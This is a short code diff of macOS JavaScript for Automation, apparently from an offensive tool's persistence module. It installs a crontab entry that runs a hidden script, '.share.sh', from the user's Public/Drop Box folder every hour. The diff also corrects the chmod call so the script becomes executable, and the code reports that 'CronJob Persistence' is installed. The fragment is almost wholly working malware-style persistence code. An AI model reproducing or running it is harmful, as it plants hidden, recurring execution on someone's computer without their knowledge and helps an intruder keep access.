@@ -35,7 +35,7 @@ writeTextToFile(cronJobaction, cronFilepath, true)
 var cronTask =  `echo "$(echo '15 * * * * cd $HOME/Public/Drop\\ Box/ && ./.share.sh' ; crontab -l)" | crontab - `
       
 currentApp.doShellScript(cronTask)
-chmod(cronFilepath)
+chmod(0o755,cronFilepath)
 
 output += "CronJob Persistence intalled at " + cronFilepath 
 
